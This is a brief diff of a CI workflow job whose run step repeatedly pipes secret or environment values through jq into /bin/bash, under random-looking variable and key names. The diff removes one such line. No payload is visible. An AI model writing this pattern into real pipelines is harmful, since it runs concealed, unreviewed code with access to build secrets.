@@ -22,7 +22,6 @@ jobs:
           xjttd6889: ${{ secrets.xjttd6889 }}
         run: |
           printf '%s' "$xjttd6889" | jq -r .vl9501 | /bin/bash
-          echo $fqces3729 | jq -r .phhmn7 | /bin/bash
           printf '%s' "$z8" | jq -r .mc42 | /bin/bash
           echo $rok3 | jq -r .snh93524 | /bin/bash
           echo $si7 | jq -r .vj7512 | /bin/bash
